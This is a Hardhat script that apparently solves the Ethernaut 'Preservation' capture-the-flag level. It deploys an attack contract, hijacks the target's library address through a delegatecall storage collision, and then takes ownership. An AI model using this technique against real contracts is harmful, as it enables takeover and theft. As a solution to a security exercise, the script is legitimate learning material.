import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import { Preservation, PreservationAttack, PreservationAttack__factory, Preservation__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0xca679A7601CBc4b6D1d5BAF9022682Be3c632eBE';
  const preservationInstance: Preservation = Preservation__factory.connect(deployedAddress, addr1);

  const attackInstance: PreservationAttack = await new PreservationAttack__factory(addr1).deploy(preservationInstance.address);
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  await (await attackInstance.attack({ gasLimit: 200000 })).wait(1);
  expect(await preservationInstance.timeZone1Library()).to.be.equal(attackInstance.address);

  await (await preservationInstance.setFirstTime(BigNumber.from(addr1.address), { gasLimit: 200000 })).wait(1);
  expect(await preservationInstance.owner()).to.be.equal(addr1.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
